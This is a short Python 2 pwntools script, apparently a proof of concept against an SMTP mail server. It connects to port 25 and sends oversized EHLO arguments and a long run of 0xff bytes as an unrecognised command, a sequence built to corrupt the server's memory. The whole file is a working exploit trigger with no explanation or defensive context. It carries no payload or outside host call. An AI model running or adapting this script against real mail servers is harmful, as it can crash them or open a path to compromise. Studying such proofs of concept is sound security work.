#!/usr/bin/python2

import time

from pwn import *


p = None


def ehlo(v):
    p.sendline("EHLO " + v)
    print(p.recvuntil("HELP"))


def unrec(v):
    p.sendline(v)
    print(p.recvuntil("command"))


def exploit():
    global p

    p = remote("localhost", 25)

    time.sleep(0.6)

    ehlo("A" * 8000)
    ehlo("B" * 16)
    unrec("\xff" * 2000)
    ehlo("A" * 8200)


if __name__ == "__main__":
    exploit()
